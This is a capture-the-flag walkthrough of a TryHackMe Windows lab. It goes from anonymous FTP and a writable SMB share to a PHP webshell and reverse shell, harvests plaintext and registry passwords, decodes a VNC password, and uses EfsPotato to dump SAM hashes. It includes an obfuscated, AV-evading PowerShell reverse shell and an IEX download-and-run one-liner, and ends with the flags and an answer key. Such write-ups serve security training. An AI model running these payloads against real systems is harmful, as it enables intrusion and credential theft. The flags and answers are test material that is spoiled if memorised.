
# PORT SCAN
---

| PORT      | SERVICE       |
| --------- | ------------- |
| 21/tcp    | ftp           |
| 80/tcp    | http          |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 443/tcp   | ssl/http      |
| 445/tcp   | microsoft-ds  |
| 3389/tcp  | ms-wbt-server |
| 5900/tcp  | vnc           |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49668/tcp | msrpc         |
| 49670/tcp | msrpc         |
| 49672/tcp | msrpc         |


# RECONNAISSANCE
---

Based on our port scan, `ftp` anonymous login is enabled and it contains a file named `notice.txt`:

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  04:26PM                  173 notice.txt
```

Let's check it up:

```
ftp 10.201.27.51
Connected to 10.201.27.51.
220 Microsoft FTP Service
Name (10.201.27.51:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49773|)
125 Data connection already open; Transfer starting.
11-14-20  04:26PM                  173 notice.txt
226 Transfer complete.
ftp>
```

We find this:

```bash
cat notice.txt

NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```

Based on the notice, we must find an `images` share, let's check:

```bash
smbmap -u 'Guest' -H 10.201.27.51

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.201.27.51:445	Name: 10.201.27.51        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	images$                                           	READ, WRITE	
	Installs$                                         	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	Users                                             	READ ONLY	
[*] Closed 1 connections
```

We have `READ,WRITE` permissions on the `images$` share, if we check it we find some simple images:

```
smbclient //10.201.27.51/images$ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 16 18:04:14 2025
  ..                                  D        0  Tue Sep 16 18:04:14 2025
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
```

Checking the web application uncovers the following source code:

![Pasted image 20250916222051.png](Pasted%20image%2020250916222051.png)

This HTML code creates a simple slideshow application that automatically cycles through images fetched from a server. The application uses jQuery to make an AJAX GET request to `/content.php`, which returns a JSON array containing image data. It calculates display timing (10 seconds per image), sets up an automatic page reload after all images have been shown, and uses the `changeImage()` function to sequentially update the image source attribute at timed intervals.

Checking the `content.php` endpoint, uncovers the same that we saw on the images share:

![Pasted image 20250916222056.png](Pasted%20image%2020250916222056.png)

Also, the images directory contains the same as the share:

![Pasted image 20250916222100.png](Pasted%20image%2020250916222100.png)

Since we can upload files here, we could attempt to upload a webshell to execute commands on the server abusing the code we saw earlier, let's proceed with exploitation.


# EXPLOITATION
---

First of all, let's create a webshell file:

```php
<?php system($_GET['cmd']); ?>
```

Now, let's upload it to the share:

```
smb: \> put shell.php
putting file shell.php as \shell.php (0.0 kb/s) (average 0.0 kb/s)
```

Trying to execute code uncovers a `404` code:

![Pasted image 20250916222107.png](Pasted%20image%2020250916222107.png)

Without the cmd parameter, we get the following error:

![Pasted image 20250916222113.png](Pasted%20image%2020250916222113.png)

Seems like a webshell isn't working, but, if we upload a reverse shell, it works, use the one [here](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php): 

```
http://10.201.27.51/images/revshell.php
```

Checking our listener uncovers the reverse shell worked:

![Pasted image 20250916222119.png](Pasted%20image%2020250916222119.png)

Let's begin privesc.


# PRIVILEGE ESCALATION
---

I'll put all answers at the end so don't worry, we find a windows DC transcript file that uncovers the administrator did some changes, we can also find the user flag:

```
C:\Users\sign\Desktop>type user_flag.txt
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
```

Since we got a shell, we can access the `installs` share from here, going into it uncovers the following files:

```
C:\Installs>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Installs

14/11/2020  16:37    <DIR>          .
14/11/2020  16:37    <DIR>          ..
14/11/2020  16:40               548 Install Guide.txt
14/11/2020  16:19               800 Install_www_and_deploy.bat
14/11/2020  14:59           339,096 PsExec.exe
14/11/2020  15:28    <DIR>          simepleslide
14/11/2020  15:01               182 simepleslide.zip
14/11/2020  16:14               147 startup.bat
14/11/2020  15:43             1,292 ultravnc.ini
14/11/2020  15:00         3,129,968 UltraVNC_1_2_40_X64_Setup.exe
14/11/2020  14:59       162,450,672 xampp-windows-x64-7.4.11-0-VC15-installer.exe
```

Checking the install files, uncover this data:

```powershell
C:\Installs>type "Install Guide.txt"
1) Disble Windows Firewall
2) Disable Defender ( it sees our remote install tools as hack tools ) 
3) Set the Admin password to the same as the setup script
4) RunAs Administrator on the setup scirpt
5) Share out the images directory as images$ to keep hidden 
6) Reboot
7) Check and fix launch of firefox
8) Check VNC access
9) Advise customer of IP to point other smart devices to http://thismachine/
10) Advise customer of the file share \\thismachine\images$
11) Remove these files as they contain passwords used with other customers.
    
    
C:\Installs>type Install_www_and_deploy.bat
@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

We found the administrator's password:

```
administrator / RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi
```

Since a question also asks us for the password of `sign`, we can query the registry editor to check up `winlogon`:

```
C:\Installs>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

We found the user's password too:

```
gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
```

Another question asks for the VNC password, checking at the file we found before, we uncover the directory where VNC is located:

```
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
```

Let's go to:

```
C:\Program Files\uvnc bvba\UltraVNC
```

We find this:

```
C:\Program Files\uvnc bvba\UltraVNC>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Program Files\uvnc bvba\UltraVNC

14/11/2020  15:54    <DIR>          .
14/11/2020  15:54    <DIR>          ..
06/02/2020  22:22           105,824 authadmin.dll
06/02/2020  22:23           213,344 authSSP.dll
16/12/2019  22:14           329,056 ddengine64.dll
06/02/2020  22:23           174,432 ldapauth.dll
06/02/2020  22:23           173,408 ldapauth9x.dll
06/02/2020  22:23           173,920 ldapauthnt4.dll
23/10/2012  22:14            72,481 Licence.rtf
06/02/2020  22:24           159,072 logging.dll
26/01/2021  19:08             1,328 mslogon.log
06/02/2020  22:24           124,768 MSLogonACL.exe
06/02/2020  22:34            14,448 Readme.txt
07/12/2019  23:06           165,216 repeater.exe
08/07/2015  00:41           100,120 schook64.dll
16/09/2019  22:31         1,831,728 SecureVNCPlugin64.dsm
30/03/2019  19:22            44,848 setcad.exe
06/02/2020  22:25            50,528 setpasswd.exe
06/02/2020  22:26            66,400 testauth.exe
14/11/2020  16:31             1,358 ultravnc.ini
14/11/2020  15:42             8,709 unins000.dat
14/11/2020  15:42         1,013,600 unins000.exe
14/11/2020  15:42            11,462 unins000.msg
29/07/2018  20:16            97,584 uvnckeyboardhelper.exe
19/10/2016  22:02         1,026,864 UVNC_Launch.exe
06/02/2020  22:26           467,296 uvnc_settings.exe
06/02/2020  22:26           127,840 vnchooks.dll
06/02/2020  22:32         1,664,864 vncviewer.exe
06/02/2020  22:35           153,742 Whatsnew.rtf
06/02/2020  22:27         2,207,072 winvnc.exe
06/02/2020  22:27           140,456 workgrpdomnt4.dll
              29 File(s)     10,721,768 bytes
               2 Dir(s)  16,869,863,424 bytes free
```

Looking for a way to search for passwords in VNC, we come across this [repository](https://github.com/frizb/PasswordDecrypts):

![Pasted image 20250916222134.png](Pasted%20image%2020250916222134.png)

The machine uses `UltraVNC`, so we should find the hardcoded DES key there, let's check:

```powershell
C:\Program Files\uvnc bvba\UltraVNC>type ultravnc.ini
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=00B2CDC0BADCAF1397
[admin]
UseRegistry=0
SendExtraMouse=1
Secure=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=0
Avilog=0
path=C:\Program Files\uvnc bvba\UltraVNC
accept_reject_mesg=
DebugLevel=8
DisableTrayIcon=0
rdpmode=0
noscreensaver=0
LoopbackOnly=0
UseDSMPlugin=0
AllowLoopback=1
AuthRequired=1
ConnectPriority=1
DSMPlugin=
AuthHosts=
DSMPluginConfig=
AllowShutdown=1
AllowProperties=1
AllowInjection=0
AllowEditClients=1
FileTransferEnabled=0
FTUserImpersonation=1
BlankMonitorEnabled=1
BlankInputsOnly=0
DefaultScale=1
primary=1
secondary=0
SocketConnect=1
HTTPConnect=0
AutoPortSelect=1
PortNumber=5900
HTTPPortNumber=5800
IdleTimeout=0
IdleInputTimeout=0
RemoveWallpaper=0
RemoveAero=0
QuerySetting=2
QueryTimeout=10
QueryDisableTime=0
QueryAccept=0
QueryIfNoLogon=1
InputsEnabled=1
LockSetting=0
LocalInputsDisabled=0
EnableJapInput=0
EnableUnicodeInput=0
EnableWin8Helper=0
kickrdp=0
clearconsole=0
service_commandline=
FileTransferTimeout=1
KeepAliveInterval=5
[admin_auth]
group1=
group2=
group3=
locdom1=0
locdom2=0
locdom3=0
[poll]
TurboMode=1
PollUnderCursor=0
PollForeground=0
PollFullScreen=1
OnlyPollConsole=0
OnlyPollOnEvent=0
MaxCpu=40
EnableDriver=0
EnableHook=1
EnableVirtual=0
SingleWindow=0
SingleWindowName=
```

There we go, we found our key:

```
passwd=B3A8F2D8BEA2F1FA70
passwd2=00B2CDC0BADCAF1397
```

Now the repo specifies the following:

![Pasted image 20250916222142.png](Pasted%20image%2020250916222142.png)

But that won't do on our case, we can use the following tool to do it:

http://aluigi.altervista.org/pwdrec/vncpwd.zip

Make sure to upload the `.exe` file to the images share so we can access it on the revshell, you can also upload it in other ways but it doesn't matter, once you got it we can use it:

![Pasted image 20250916222150.png](Pasted%20image%2020250916222150.png)

Let's use the tool:

```
c:\xampp\htdocs\images>.\vncpwd.exe B3A8F2D8BEA2F1FA70

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or longer than 8 chars)

  Password:   5upp0rt9

  Press RETURN to exit
```

We found the password:

```
5upp0rt9
```

Now let's finish our real privesc, we already got credentials for the administrator but using psexec inside or outside the reverse shell doesn't work, what can we do then?


### Getting the NTLM Hash of Administrator (For showcasing purposes only)

Checking our privileges, uncover the following:

```powershell
c:\xampp\htdocs\images>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

We got `SeImpersonatePrivilege`, if you've read previous writeups I've done, you should be able to remember I generally abuse this privilege with `EfsPotato`, if you haven't read any other writeups from me, I recommend you this one which uncover what I've told you:

- [Stealth Writeup](https://github.com/smoothment/Hacking-Notes/blob/main/CYBERSECURITY/CTF/TRYHACKME/STEALTH.md)

Let's recall what I did in that one machine:

![Pasted image 20250916222157.png](Pasted%20image%2020250916222157.png)

![Pasted image 20250916222201.png](Pasted%20image%2020250916222201.png)

I used `EfsPotato` to dump the SAM and SYSTEM in order to get the NTLM hash of the administrator user, let's attempt to do the following here, get `EfsPotato` from here:

https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs

You can upload it with easy using smb as before, once you got it, make sure to compile it:

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

Nice, we got the executable now, let's check if using it grants us `nt authority\system` privileges:

```
.\EfsPotato.exe "whoami"
```

![Pasted image 20250916222208.png](Pasted%20image%2020250916222208.png)

There we go, let's do the same as before then, let's copy the SAM and SYSTEM, do this:

```
.\EfsPotato.exe "cmd /c reg save hklm\sam c:\xampp\htdocs\images\sam.hiv && reg save hklm\system c:\xampp\htdocs\images\system.hiv"
```

If we check the images directory, we find the sam and system:

```
c:\xampp\htdocs\images>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of c:\xampp\htdocs\images

17/09/2025  03:52    <DIR>          .
17/09/2025  03:52    <DIR>          ..
17/09/2025  03:49            25,441 EfsPotato.cs
17/09/2025  03:49            17,920 EfsPotato.exe
10/01/2021  22:52           134,193 internet-1028794_1920.jpg
10/01/2021  22:50           363,259 man-1459246_1280.png
10/01/2021  22:50           691,570 monitor-1307227_1920.jpg
10/01/2021  22:53         1,461,192 neon-sign-4716257_1920.png
17/09/2025  03:17             9,405 revshell.php
17/09/2025  03:52            49,152 sam.hiv
17/09/2025  03:52        11,382,784 system.hiv
17/09/2025  03:39            54,784 vncpwd.exe
              10 File(s)     14,189,700 bytes
               2 Dir(s)  17,294,151,680 bytes free
```

Let's go to the images directory on the browser to get the files:

![Pasted image 20250916222212.png](Pasted%20image%2020250916222212.png)

Download them, once you got the files, we can use `impacket-secretsdump` to get the NTLM hash of the admin:

```
impacket-secretsdump -sam sam.hiv -system system.hiv local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x54892518d3dba223f5c18c1525e66082
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c973bf8540c79881d2a156b948bc6d2d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60151fb22df252abfcf8a9e6e473c5d7:::
sign:1001:aad3b435b51404eeaad3b435b51404ee:472cc28d7c14533123417bf440416993:::
[*] Cleaning up... 
```

We got our hash, if `psexec` worked, we should be able to get a shell using it, since it doesn't work, I only showcased you this to show another path that could work on other machines, now let's get a reverse shell using another method.


### Getting a Reverse shell as NT AUTHORITY\SYSTEM (Real Path)

Now let's go with the real method to achieve a reverse shell and finish the CTF on this machine, make sure to create a `shell.ps1` file on your Linux machine with the following content, you can test other PowerShell rev shells too:

```powershell
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex

# Obfuscated IP and port using environment variables
$env:tmp_ip = "PUT_IP_HERE"
$env:tmp_port = "4444"

# Random delay to evade behavioral analysis
Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)

# Main reverse shell code
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($env:tmp_ip, $env:tmp_port);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("© Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2 = $I + (../../IMAGES/Pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()

# Clean up environment variables
Remove-Item Env:tmp_ip
Remove-Item Env:tmp_port

# Add some junk code to confuse analysis
$junk = @(
    "This is harmless text",
    "System diagnostics completed",
    "PowerShell module loaded successfully"
)
$null = $junk | ForEach-Object { $_.ToUpper() }
```

Now you need to host a python server and use `EfsPotato` to download and execute the file with `nt authority\system` privileges, you can do:

```
.\EfsPotato.exe "cmd /c powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/shell.ps1')""
```

![Pasted image 20250916222218.png](Pasted%20image%2020250916222218.png)

Make sure to set up a listener before doing this, if you did, you should receive a connection as `nt authority\system`:

![Pasted image 20250916222221.png](Pasted%20image%2020250916222221.png)

We can read the flag now:

```
C:\Users\Administrator\Desktop> type admin_flag.txt
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
```

Now as I've told you before, I will put all answers here:

How many TCP ports under 1024 are open?

```
6
```

What is the hidden share where images should be copied to?

```
images$
```

What user is signed into the console session?

```
sign
```

What hidden, non-standard share is only remotely accessible as an administrative account?

```
installs$
```

What is the content of user_flag.txt?

```
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
```

What is the Users Password?

```
gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
```

What is the Administrators Password?

```
RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi
```

What executable is used to run the installer with the Administrator username and password? 

```
PsExec.exe
```

What is the VNC Password?

```
5upp0rt9
```

What is the contents of the admin_flag.txt?

```
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
```

![Pasted image 20250916222230.png](Pasted%20image%2020250916222230.png)

